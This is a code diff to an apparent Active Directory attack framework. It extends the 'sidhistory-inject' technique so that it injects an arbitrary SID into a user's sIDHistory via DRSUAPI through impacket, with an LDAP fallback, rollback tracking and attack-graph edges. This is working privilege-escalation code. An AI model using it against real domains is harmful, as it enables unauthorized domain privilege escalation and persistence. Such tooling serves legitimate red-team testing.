@@ -20,6 +20,7 @@ from adaf_attack.core.acl import (
     sd_set_owner,
 )
 from adaf_attack.core.graph import AttackGraph
+from adaf_attack.core.impacket_helper import ImpacketMissing, require_impacket
 from adaf_attack.core.ldap_ops import (
     attr_strings,
     attr_value,
@@ -395,6 +396,34 @@ class AdminSdHolderPersist:
             conn.unbind()
 
 
+_SIDHISTORY_ERROR_NOTE = (
+    "Domain controllers reject direct LDAP writes to sIDHistory; "
+    "injection requires DRSUAPI DsAddSidHistory (MS-DRSR) with "
+    "cross-domain migration privileges."
+)
+
+
+def _impacket_available() -> bool:
+    try:
+        import impacket  # noqa: F401
+    except ImportError:
+        return False
+    return True
+
+
+def _ldap_inject(conn: Any, session: Session, dn: str, extra_sid: str) -> tuple[bool, str]:
+    ok = bool(conn.modify(dn, {"sIDHistory": [(MODIFY_ADD, [extra_sid])]}))
+    if ok:
+        register_add_value_rollback(
+            session,
+            target_dn=dn,
+            attribute="sIDHistory",
+            values=[extra_sid],
+            rollback="Remove the injected sIDHistory value.",
+        )
+    return ok, str(conn.result)
+
+
 @register_from_catalog("sidhistory-inject")
 class SidHistoryInject:
     def run(
@@ -409,14 +438,43 @@ class SidHistoryInject:
         require_force("sidhistory-inject", force)
         sam = require_param(kwargs, "sam", "write_target")
         extra_sid = require_param(kwargs, "sid", "extra_sid", "value")
+        requested = kwargs.get("method")
+        fallback = False
+        if requested is None:
+            requested = "drsuapi" if _impacket_available() else "ldap"
+            if requested == "ldap":
+                fallback = True
+        method = str(requested).lower()
+        if method not in {"drsuapi", "ldap"}:
+            raise RuntimeError(f"Unsupported sIDHistory injection method: {requested}")
         conn, base_dn, _cfg = ldap_connect(target)
         try:
             dn, entry = _lookup_or_raise(
-                conn, base_dn, sam, ["sAMAccountName", "distinguishedName", "sIDHistory"]
+                conn,
+                base_dn,
+                sam,
+                ["sAMAccountName", "distinguishedName", "objectSid", "sIDHistory"],
             )
             previous = attr_strings(entry, "sIDHistory")
-            ok = bool(conn.modify(dn, {"sIDHistory": [(MODIFY_ADD, [extra_sid])]}))
-            if ok:
+            drs_result: dict[str, Any] | None = None
+            if method == "drsuapi":
+                try:
+                    require_impacket("sidhistory-inject")
+                    from adaf_attack.core.drs_sidhistory import add_sid_history
+
+                    source_domain = str(kwargs.get("source_domain") or base_dn)
+                    dst_sid = sid_from_ldap_value(attr_value(entry, "objectSid")) or ""
+                    drs_result = add_sid_history(
+                        target,
+                        dst_dn=dn,
+                        dst_sid=dst_sid,
+                        extra_sid=extra_sid,
+                        source_domain=source_domain,
+                    )
+                except ImpacketMissing:
+                    method = "ldap"
+                    fallback = True
+            if drs_result is not None and drs_result["ok"]:
                 register_add_value_rollback(
                     session,
                     target_dn=dn,
@@ -424,20 +482,50 @@ class SidHistoryInject:
                     values=[extra_sid],
                     rollback="Remove the injected sIDHistory value.",
                 )
+                result = {
+                    "ok": True,
+                    "sam": sam,
+                    "dn": dn,
+                    "sid": extra_sid,
+                    "previous": previous,
+                    "method": "drsuapi",
+                    "error_code": drs_result["error_code"],
+                }
+                graph.add_edge(
+                    f"USER@{sam.upper()}@{target.domain.upper()}",
+                    f"SID@{extra_sid}",
+                    "HasSIDHistory",
+                )
+                console.print(f"[green]sidhistory-inject[/green] {sam} + {extra_sid} ok=True")
+                return finish(session, graph, "sidhistory-inject", result, ok=True)
+            if drs_result is not None:
+                result = {
+                    "ok": False,
+                    "sam": sam,
+                    "dn": dn,
+                    "sid": extra_sid,
+                    "previous": previous,
+                    "method": "drsuapi",
+                    "error": drs_result["error"],
+                    "error_code": drs_result["error_code"],
+                    "error_note": _SIDHISTORY_ERROR_NOTE,
+                }
+                console.print(f"[red]sidhistory-inject[/red] {sam} + {extra_sid} ok=False")
+                return finish(session, graph, "sidhistory-inject", result, ok=False)
+            ok, ldap_result = _ldap_inject(conn, session, dn, extra_sid)
             result = {
                 "ok": ok,
                 "sam": sam,
                 "dn": dn,
                 "sid": extra_sid,
                 "previous": previous,
-                "ldap_result": str(conn.result),
+                "method": method,
+                "ldap_result": ldap_result,
             }
+            if fallback:
+                result["fallback"] = True
             if not ok:
-                result["error_note"] = (
-                    "Domain controllers reject direct LDAP writes to sIDHistory; "
-                    "injection requires DRSUAPI DsAddSidHistory (MS-DRSR) with "
-                    "cross-domain migration privileges."
-                )
+                result["error_note"] = _SIDHISTORY_ERROR_NOTE
             if ok:
                 graph.add_edge(
                     f"USER@{sam.upper()}@{target.domain.upper()}",
